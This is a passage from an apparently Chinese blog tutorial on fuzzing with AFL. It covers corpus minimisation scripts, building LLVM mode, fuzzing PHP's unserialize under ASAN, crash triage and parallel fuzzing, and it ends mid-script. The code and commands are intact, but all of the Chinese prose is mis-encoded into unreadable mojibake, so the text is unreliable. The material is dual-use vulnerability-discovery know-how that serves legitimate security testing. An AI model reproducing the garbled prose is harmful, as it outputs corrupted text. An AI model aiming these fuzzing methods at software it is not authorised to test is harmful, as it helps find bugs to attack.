href="#1-5-è¯­æ–™åº“è’¸é¦-Corpus-Distillation" class="headerlink" title="1.5 è¯­æ–™åº“è’¸é¦(Corpus Distillation)"></a>1.5 è¯­æ–™åº“è’¸é¦(Corpus Distillation)</h4><p>ä¸€èˆ¬æ¥è¯´åœ¨è¿›è¡Œfuzzä¹‹å‰æ„å»ºä¸€ä»½æœ‰æ•ˆçš„è¯­æ–™åº“æ˜¯ååˆ†æœ‰å¿…è¦çš„ï¼Œè¿™å°†ä½œä¸ºç¨‹åºå¼€å§‹æ—¶çš„ç§å­ã€‚</p><p>è¯­æ–™åº“çš„ä¿¡æ¯æ¥æºä¸»è¦å¦‚ä¸‹:</p><ul><li>ä½¿ç”¨é¡¹ç›®è‡ªèº«æä¾›çš„æµ‹è¯•ç”¨ä¾‹</li><li>ç›®æ ‡ç¨‹åºbugæäº¤é¡µé¢</li><li>ä½¿ç”¨æ ¼å¼è½¬æ¢å™¨ï¼Œç”¨ä»ç°æœ‰çš„æ–‡ä»¶æ ¼å¼ç”Ÿæˆä¸€äº›ä¸å®¹æ˜“æ‰¾åˆ°çš„æ–‡ä»¶æ ¼å¼ï¼š</li><li>aflæºç çš„testcasesç›®å½•ä¸‹æä¾›äº†ä¸€äº›æµ‹è¯•ç”¨ä¾‹</li><li>å…¶ä»–å¼€æºçš„è¯­æ–™åº“</li></ul><p>æ”¶é›†å®Œåå¯ä»¥ä½¿ç”¨aflæä¾›çš„å·¥å…·æ¥å¯¹è¯­æ–™åº“è¿›è¡Œè¿›ä¸€æ­¥çš„å¤„ç†:</p><ol><li>afl-cmin: ç§»é™¤æ‰§è¡Œç›¸åŒä»£ç çš„è¾“å…¥æ–‡ä»¶<br>afl-cminçš„æ ¸å¿ƒæ€æƒ³æ˜¯: å°è¯•æ‰¾åˆ°ä¸è¯­æ–™åº“å…¨é›†å…·æœ‰ç›¸åŒè¦†ç›–èŒƒå›´çš„æœ€å°å­é›†ã€‚<br>å®ƒä¸€èˆ¬çš„ä¸¤ç§æ‰§è¡Œæ¨¡å¼æ˜¯:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-cmin -i input_dir -o output_dir -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><ol start="2"><li>afl-tmin: å‡å°å•ä¸ªè¾“å…¥æ–‡ä»¶çš„å¤§å°<br>å®ƒæœ‰ä¸¤ç§å·¥ä½œæ¨¡å¼: instrumented modeå’Œcrash modeã€‚é»˜è®¤çš„å·¥ä½œæ–¹å¼æ˜¯instrumented mode</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># instrumented mode</span><br><span class="line">afl-tmin -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># crash mode å°†ä¼šå‰”é™¤å¯¼è‡´crashçš„æ–‡ä»¶</span><br><span class="line">afl-tmin -x -i input_file -o output_file -- /path/to/tested/program [params] @@</span><br></pre></td></tr></table></figure><p>ç”±äºåªèƒ½é’ˆå¯¹å•ä¸ªç›®æ ‡è¿›è¡Œä½¿ç”¨ï¼Œå› æ­¤ä½¿ç”¨å¦‚ä¸‹shellè„šæœ¬è¿›è¡Œæ‰¹é‡å¤„ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> *; <span class="keyword">do</span> afl-tmin -i <span class="variable">$i</span> -o tmin-<span class="variable">$i</span> -- ~/path/to/tested/program [params] @@; <span class="keyword">done</span>;</span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¿®æ”¹å¦‚ä¸‹çš„Pythonè„šæœ¬è¿›è¡Œé¢„å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmin</span><span class="params">()</span>:</span></span><br><span class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </span><br><span class="line">    os.system(<span class="string">'afl-cmin -i seeds/tmin -o seeds/cmin '</span> + command)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tmin</span><span class="params">()</span>:</span></span><br><span class="line">    command = <span class="string">' -m 300 -t 5000 ./utilities/magick convert @@ /dev/null'</span> </span><br><span class="line">    seed_list = os.listdir(<span class="string">'seeds/all_format'</span>)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</span><br><span class="line">        in_file = os.path.join(<span class="string">'seeds/all_format'</span>, seed)</span><br><span class="line">        out_file = os.path.join(<span class="string">'seeds/tmin'</span>, seed)</span><br><span class="line">        <span class="keyword">if</span> os.path.getsize(in_file) &gt; <span class="number">1024</span>*<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">if</span> os.path.getsize(in_file) &lt; <span class="number">1024</span>*<span class="number">3</span> <span class="keyword">and</span> <span class="keyword">not</span> seed.endswith(<span class="string">'.txt'</span>):</span><br><span class="line">                os.system(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</span><br><span class="line">                print(<span class="string">'afl-tmin -i '</span> + in_file + <span class="string">' -o '</span> + out_file + command)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">elif</span> os.path.getsize(in_file) &gt; <span class="number">0</span>:</span><br><span class="line">            shutil.copyfile(in_file,out_file)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(origin_seeds)</span>:</span></span><br><span class="line">    seed_list = os.listdir(origin_seeds)</span><br><span class="line">    <span class="keyword">for</span> seed <span class="keyword">in</span> seed_list:</span><br><span class="line">        seed_in = os.path.join(origin_seeds, seed)</span><br><span class="line">        file_name = (os.path.splitext(seed)[<span class="number">0</span>])</span><br><span class="line">        coder_list = os.listdir(<span class="string">'coders'</span>)</span><br><span class="line">        <span class="keyword">for</span> cfile <span class="keyword">in</span> coder_list:</span><br><span class="line">            <span class="keyword">if</span> cfile.endswith(<span class="string">'.c'</span>):</span><br><span class="line">                extern = cfile[:cfile.find(<span class="string">'.c'</span>)]</span><br><span class="line">                seed_out = <span class="string">'seeds/all_format/'</span> + file_name + <span class="string">'.'</span> + extern</span><br><span class="line">                os.system(<span class="string">'utilities/magick convert '</span> + seed_in + <span class="string">' '</span> + seed_out)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: '</span> + sys.argv[<span class="number">0</span>] + <span class="string">' origin_seeds_dir'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        origin_seeds_dir = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            os.mkdir(<span class="string">'seeds'</span>)</span><br><span class="line">            seeds_path = os.path.join(os.path.abspath(<span class="string">'.'</span>),<span class="string">'seeds'</span>)</span><br><span class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'all_format'</span>))</span><br><span class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'cmin'</span>))</span><br><span class="line">            os.mkdir(os.path.join(seeds_path,<span class="string">'tmin'</span>))</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'make dir fail!'</span></span><br><span class="line">        convert(origin_seeds_dir)</span><br><span class="line">        tmin()</span><br><span class="line">        cmin()</span><br></pre></td></tr></table></figure><p>é¢„å¤„ç†è„šæœ¬æ¥è‡ª:<a href="http://0x4c43.cn/2018/0722/use-afl-for-fuzz-testing/" target="_blank" rel="noopener">ã€Šä½¿ç”¨ AFL è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ã€‹</a></p><h3 id="2-LLVM-Modeæ¨¡å¼"><a href="#2-LLVM-Modeæ¨¡å¼" class="headerlink" title="2. LLVM Modeæ¨¡å¼"></a>2. LLVM Modeæ¨¡å¼</h3><h4 id="2-1-å¯ç”¨llvm"><a href="#2-1-å¯ç”¨llvm" class="headerlink" title="2.1 å¯ç”¨llvm"></a>2.1 å¯ç”¨llvm</h4><p>LLVM Modeæ¨¡å¼ç¼–è¯‘ç¨‹åºå¯ä»¥è·å¾—æ›´å¿«çš„Fuzzingé€Ÿåº¦ï¼Œå› æ­¤é’ˆå¯¹å¤§å‹é¡¹ç›®å¯ä»¥è€ƒè™‘å¯ç”¨ã€‚</p><p>ä¸‹è½½å¿…è¦çš„å®‰è£…åŒ…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://releases.llvm.org/8.0.0/llvm-8.0.0.src.tar.xz</span><br><span class="line">wget http://releases.llvm.org/8.0.0/compiler-rt-8.0.0.src.tar.xz</span><br><span class="line">wget http://releases.llvm.org/8.0.0/clang-tools-extra-8.0.0.src.tar.xz</span><br><span class="line">wget http://releases.llvm.org/8.0.0/cfe-8.0.0.src.tar.xz</span><br></pre></td></tr></table></figure><p>è§£å‹ç¼©</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xz -d ./*</span><br><span class="line">tar xvf cfe-8.0.0.src.tar</span><br><span class="line">tar xvf clang-tools-extra-8.0.0.src.tar</span><br><span class="line">tar xvf llvm-8.0.0.src.tar</span><br><span class="line">tar xvf compiler-rt-8.0.0.src.tar</span><br></pre></td></tr></table></figure><p>æºç åˆå¹¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mv cfe-8.0.0.src clang</span><br><span class="line">mv clang llvm-8.0.0.src/tools</span><br><span class="line">mv clang-tools-extra-8.0.0.src extra</span><br><span class="line">mv extra llvm-8.0.0.src/tools/clang</span><br><span class="line">mv compiler-rt-8.0.0.src compiler-rt</span><br><span class="line">mv compiler-rt llvm-8.0.0.src/projects</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®‰è£…</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir build-8.0</span><br><span class="line">cmake ../llvm-8.0.0.src/</span><br><span class="line">cmake --build .</span><br><span class="line">cmake --build . --target install</span><br><span class="line">cmake -DCMAKE_INSTALL_PREFIX=/tmp/llvm -P cmake_install.cmake</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ç¼–è¯‘å®‰è£…å¯¹ç¡¬ä»¶é…ç½®å’Œç¡¬ç›˜çš„ç©ºé—´è¦æ±‚æ¯”è¾ƒé«˜ï¼Œæ‰€ä»¥ä½ å¯ä»¥ç›´æ¥ä½¿ç”¨æºè¿›è¡Œå®‰è£…ï¼Œæ¯”å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install llvm clang</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘å®‰è£…aflçš„llvmæ¨¡å—<br>(æˆ‘çš„ä½¿ç”¨çš„æ˜¯kali linux 2019.1è¿›è¡Œç¼–è¯‘çš„ï¼Œclangç‰ˆæœ¬è¿‡é«˜ä¼šå¤±è´¥ï¼Œä½¿ç”¨clang++ä¹Ÿä¼šå¤±è´¥ï¼Œæ‰€ä»¥æœ€ç»ˆå‘ç°ä¸‹é¢æ–¹æ³•å¯è¡Œ)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd afl/llvm_mode</span><br><span class="line">export CXX=/usr/bin/g++</span><br><span class="line">export CC=/usr/bin/clang-6.0</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>å› ä¸ºclangæ²¡æœ‰åŠæ³•ä½¿ç”¨<code>update-alternatives</code>ï¼Œå› æ­¤æˆ‘ç›´æ¥ä¿®æ”¹è½¯è¿æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/bin/clang-6.0 /usr/bin/clang</span><br><span class="line">ln -sb /usr/bin/clang++-6.0 /usr/bin/clang++</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥æ­£å¸¸ä½¿ç”¨afl-clang-fastäº†<br><img src="https://i.loli.net/2019/05/15/5cdc18ecc0cc062251.png" alt="9B83B620-E1A2-420F-81CA-FC6C4777F4EB.png"></p><p>å…¶å®ä»¥ä¸Šå‡å¤ªè´¹åŠ²ï¼Œè¿˜æœ‰æ›´ç®€å•çš„æ–¹æ³•ï¼Œkali linuxçš„æºä¸­åŒ…å«äº†aflï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥aptè¿›è¡Œå®‰è£…ï¼Œè£…å¥½ä¹‹åafl-clang-fastä¹Ÿå°±æœ‰äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install afl</span><br></pre></td></tr></table></figure><h4 id="2-2-ä½¿ç”¨LLVM-Modeæ¨¡å¼è¿›è¡Œfuzz"><a href="#2-2-ä½¿ç”¨LLVM-Modeæ¨¡å¼è¿›è¡Œfuzz" class="headerlink" title="2.2 ä½¿ç”¨LLVM Modeæ¨¡å¼è¿›è¡Œfuzz"></a>2.2 ä½¿ç”¨LLVM Modeæ¨¡å¼è¿›è¡Œfuzz</h4><p>ç¼–è¯‘æ’æ¡©</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali-z ~/Desktop/fuzz/afl$ ./afl-clang-fast -g -o ./zerotest/vuln-fast ./zerotest/vuln.c</span><br></pre></td></tr></table></figure><p>ä¹‹åé‡å¤ä¸Šé¢çš„æ–¹å¼è¿›è¡Œfuzzå³å¯ï¼Œæ¥ä¸‹æ¥å±•ç¤ºä¸€ä¸ªä½¿ç”¨æ­¤æ¨¡å¼fuzz phpå†…æ ¸ä»£ç çš„ä¾‹å­ã€‚</p><h5 id="1-ä¸‹è½½ç›®æ ‡ä»£ç "><a href="#1-ä¸‹è½½ç›®æ ‡ä»£ç " class="headerlink" title="1. ä¸‹è½½ç›®æ ‡ä»£ç "></a>1. ä¸‹è½½ç›®æ ‡ä»£ç </h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/php/php-src/archive/php-7.2.11.tar.gz &amp;&amp; tar xf php-7.2.11.tar.gz</span><br></pre></td></tr></table></figure><h5 id="2-è¿›è¡Œç¼–è¯‘æ’æ¡©"><a href="#2-è¿›è¡Œç¼–è¯‘æ’æ¡©" class="headerlink" title="2. è¿›è¡Œç¼–è¯‘æ’æ¡©"></a>2. è¿›è¡Œç¼–è¯‘æ’æ¡©</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd php-src-php-7.2.11</span><br><span class="line">./buildconf --force</span><br><span class="line">CC=afl-clang-fast CXX=afl-clang-fast++ ./configure</span><br><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>PS: å¦‚æœæŠ¥é”™ç¼ºå¤±libconvï¼Œåˆ™åœ¨<code>Makefile</code>ä¸­çš„<code>EXTRA_LIBS =</code>æ·»åŠ <code>-liconv</code></p><h5 id="3-è¿›è¡Œæºä»£ç çš„ä¿®æ”¹"><a href="#3-è¿›è¡Œæºä»£ç çš„ä¿®æ”¹" class="headerlink" title="3. è¿›è¡Œæºä»£ç çš„ä¿®æ”¹"></a>3. è¿›è¡Œæºä»£ç çš„ä¿®æ”¹</h5><p>æœªä¿®æ”¹ä¹‹å‰  sapi/cli/php_cli.c<br><img src="https://i.loli.net/2019/05/15/5cdc19514eecd50209.png" alt="BB750539-176B-4A52-A437-D370814C7CCE.png"><br>ä¿®æ”¹ä¹‹å   sapi/cli/php_cli.c<br><img src="https://i.loli.net/2019/05/15/5cdc1963129fc31389.png" alt="C21FA188-6FFE-440A-B0AD-BA0F8C60312C.png"><br>ä¿®æ”¹å®Œä¹‹åæ‰§è¡Œå¦‚ä¸‹è¿›è¡Œrebuild</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AFL_USE_ASAN=1 make</span><br></pre></td></tr></table></figure><p>PS: ä¹‹æ‰€ä»¥è¿›è¡Œè¿™æ ·çš„ä¿®æ”¹ï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬ä½¿ç”¨<code>php -r</code>æ¥eval php stringï¼Œå› æ­¤å®šä½åˆ°<code>sapi/cli/php_cli.c</code>è¿›è¡Œä»£ç çš„ä¿®æ”¹ç¦»å¼€æå‡åæœŸfuzzçš„æ•ˆç‡ã€‚</p><h5 id="4-æ„é€ ä¸€ä¸ªè¾“å…¥ç‚¹"><a href="#4-æ„é€ ä¸€ä¸ªè¾“å…¥ç‚¹" class="headerlink" title="4. æ„é€ ä¸€ä¸ªè¾“å…¥ç‚¹"></a>4. æ„é€ ä¸€ä¸ªè¾“å…¥ç‚¹</h5><p>æˆ‘ä»¬æƒ³åœ¨fuzzçš„æ—¶å€™ä»stdinè¿›è¡Œæ•°æ®çš„è¾“å…¥ï¼Œå› æ­¤æ„é€ å¦‚ä¸‹è¾“å…¥ç‚¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unserialize(file_get_contents(â€œphp://stdinâ€));</span><br></pre></td></tr></table></figure><h5 id="5-æ ¹æ®ä¸Šè¿°çš„æ„é€ ç‚¹æ„é€ è¾“å…¥æ•°æ®"><a href="#5-æ ¹æ®ä¸Šè¿°çš„æ„é€ ç‚¹æ„é€ è¾“å…¥æ•°æ®" class="headerlink" title="5. æ ¹æ®ä¸Šè¿°çš„æ„é€ ç‚¹æ„é€ è¾“å…¥æ•°æ®"></a>5. æ ¹æ®ä¸Šè¿°çš„æ„é€ ç‚¹æ„é€ è¾“å…¥æ•°æ®</h5><p>æ­¤å¤„è´¦æˆ·è¦è€ƒè™‘æ„é€ ä¸åŒç±»ç±»å‹çš„è¾“å…¥æ•°æ®ï¼Œæ„é€ å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mkdir serialized_data &amp;&amp; cd serialized_data</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize(&quot;a&quot;);&apos; &gt; string</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize(1);&apos; &gt; number</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize([1,2]);&apos; &gt; array_of_num</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize([&quot;1&quot;,&quot;2&quot;]);&apos; &gt; array_of_str</span><br><span class="line">../sapi/cli/php -r &apos;echo serialize([[&quot;1&quot;,&quot;2&quot;],[&quot;3&quot;,&quot;4&quot;],[1,2]]);&apos; &gt; array_of_array</span><br><span class="line">echo &apos;O:6:&quot;zeroyu&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;npusec2&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&apos; &gt; class</span><br></pre></td></tr></table></figure><h5 id="6-å¼€å§‹fuzz"><a href="#6-å¼€å§‹fuzz" class="headerlink" title="6. å¼€å§‹fuzz"></a>6. å¼€å§‹fuzz</h5><p>ä¸ºäº†ä»åœ°å€æ¸…ç†(ASAN)ä¸­è·å¾—æœ‰ç”¨çš„ç»“æœï¼Œæœ‰å¿…è¦è®¾ç½®ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œä»¥ä¾¿PHPç¦ç”¨å…¶è‡ªå®šä¹‰å†…å­˜åˆ†é…å™¨ï¼Œä»è€Œä½¿å†…å­˜å®‰å…¨é—®é¢˜å¯¹ASANå¯è§ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE_ZEND_ALLOC=0 screen -S zeroyu</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨screenå¯ä»¥éšæ—¶è¿›å…¥æŸ¥çœ‹fuzzçš„ç»“æœ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -r zeroyu</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¼€å§‹fuzz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd..</span><br><span class="line">afl-fuzz -i serialized_data -o basic_fuzz -m none -- ./sapi/cli/php -r &apos;unserialize(file_get_contents(&quot;php://stdin&quot;));&apos;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/05/15/5cdc197fb417a82164.png" alt="11B4692E-E516-4743-9FAC-B39AB1C03ED0.png"></p><h5 id="7-åˆ†æcrash"><a href="#7-åˆ†æcrash" class="headerlink" title="7. åˆ†æcrash"></a>7. åˆ†æcrash</h5><p>ç”¨æ˜¯ä½¿ç”¨å¦‚ä¸‹bashè„šæœ¬æ¥å¯»æ‰¾å¯èƒ½æ˜¯bugçš„crashï¼Œå› ä¸ºæœ‰äº›æ˜¯è‰¯æ€§çš„crashï¼Œæ˜¯ç”±äºASANæ— æ³•åˆ†é…è¶³å¤Ÿçš„å†…å­˜ã€‚è¿™æ˜¯å› ä¸ºASANéœ€è¦é¢å¤–çš„å†…å­˜æ¥è·Ÿè¸ªæ‰€æœ‰åˆ†é…ï¼Œè€Œç²¾å¿ƒç¼–åˆ¶çš„åºåˆ—åŒ–å¯¹è±¡å¯èƒ½ä¼šè§¦å‘å¤§å†…å­˜åˆ†é…ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> FILE <span class="keyword">in</span> $(ls id*); <span class="keyword">do</span> cat <span class="variable">$FILE</span> | ../../sapi/cli/php -r <span class="string">"unserialize(file_get_contents('php://stdin'));"</span> 2&gt;&amp;1 | grep -E <span class="string">"SUMMARY|ERROR"</span> | grep -v <span class="string">"LargeMmap"</span> &amp;&amp; <span class="built_in">echo</span> <span class="variable">$FILE</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>å‚è€ƒ: <a href="https://www.tripwire.com/state-of-security/vert/fuzzing-php-for-fun-and-profit/" target="_blank" rel="noopener">ã€ŠFuzzing PHP for Fun and Profitã€‹</a></p><h3 id="3-é»‘ç›’æµ‹è¯•"><a href="#3-é»‘ç›’æµ‹è¯•" class="headerlink" title="3. é»‘ç›’æµ‹è¯•"></a>3. é»‘ç›’æµ‹è¯•</h3><p>å‚è€ƒï¼š<a href="https://paper.tuisec.win/detail/45e6d0a790d79da" target="_blank" rel="noopener">ã€ŠAFLæ¼æ´æŒ–æ˜æŠ€æœ¯æ¼«è°ˆï¼ˆä¸€ï¼‰ï¼šç”¨AFLå¼€å§‹ä½ çš„ç¬¬ä¸€æ¬¡Fuzzingã€‹</a></p><h3 id="4-å¹¶è¡Œæµ‹è¯•"><a href="#4-å¹¶è¡Œæµ‹è¯•" class="headerlink" title="4. å¹¶è¡Œæµ‹è¯•"></a>4. å¹¶è¡Œæµ‹è¯•</h3><h4 id="4-1-å•ç³»ç»Ÿå¹¶è¡Œ"><a href="#4-1-å•ç³»ç»Ÿå¹¶è¡Œ" class="headerlink" title="4.1 å•ç³»ç»Ÿå¹¶è¡Œ"></a>4.1 å•ç³»ç»Ÿå¹¶è¡Œ</h4><p>æŸ¥çœ‹ç³»ç»Ÿæ ¸å¿ƒæ•°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/cpuinfo| grep &quot;cpu cores&quot;| uniq</span><br></pre></td></tr></table></figure><p>afl-fuzzå¹¶è¡ŒFuzzingï¼Œä¸€èˆ¬çš„åšæ³•æ˜¯é€šè¿‡-Må‚æ•°æŒ‡å®šä¸€ä¸ªä¸»Fuzzer(Master Fuzzer)ã€é€šè¿‡-Så‚æ•°æŒ‡å®šå¤šä¸ªä»Fuzzer(Slave Fuzzer)ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -M fuzzer1 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer2 -- ./program</span><br><span class="line">$ screen afl-fuzz -i testcases/ -o sync_dir/ -S fuzzer3 -- ./program</span><br></pre></td></tr></table></figure><p>PS: -oæŒ‡å®šçš„æ˜¯ä¸€ä¸ªåŒæ­¥ç›®å½•ï¼Œå¹¶è¡Œæµ‹è¯•ä¸­ï¼Œæ‰€æœ‰çš„Fuzzerå°†ç›¸äº’åä½œï¼Œåœ¨æ‰¾åˆ°æ–°çš„ä»£ç è·¯å¾„æ—¶ï¼Œç›¸äº’ä¼ é€’æ–°çš„æµ‹è¯•ç”¨ä¾‹ã€‚æ‰€ä»¥ä¸ç”¨æ‹…å¿ƒé‡å¤çš„é—®é¢˜</p><p>ä¸¤ä¸ªè¾…åŠ©å·¥å…·:</p><ul><li><code>afl-whatsup</code>å·¥å…·å¯ä»¥æŸ¥çœ‹æ¯ä¸ªfuzzerçš„è¿è¡ŒçŠ¶æ€å’Œæ€»ä½“è¿è¡Œæ¦‚å†µï¼ŒåŠ ä¸Š-sé€‰é¡¹åªæ˜¾ç¤ºæ¦‚å†µï¼Œå…¶ä¸­çš„æ•°æ®éƒ½æ˜¯æ‰€æœ‰fuzzerçš„æ€»å’Œã€‚</li><li><code>afl-gotcpu</code>å·¥å…·å¯ä»¥æŸ¥çœ‹æ¯ä¸ªæ ¸å¿ƒä½¿ç”¨çŠ¶æ€ã€‚</li></ul><h4 id="4-2-å¤šç³»ç»Ÿå¹¶è¡Œ"><a href="#4-2-å¤šç³»ç»Ÿå¹¶è¡Œ" class="headerlink" title="4.2 å¤šç³»ç»Ÿå¹¶è¡Œ"></a>4.2 å¤šç³»ç»Ÿå¹¶è¡Œ</h4><p>å‹ç¼©æ¯ä¸ªfuzzerå®ä¾‹ç›®å½•ä¸­queueä¸‹çš„æ–‡ä»¶ï¼Œé€šè¿‡å¦‚ä¸‹SSHè„šæœ¬åŒæ­¥åˆ†å‘åˆ°å…¶ä»–æœºå™¨ä¸Šè§£å‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 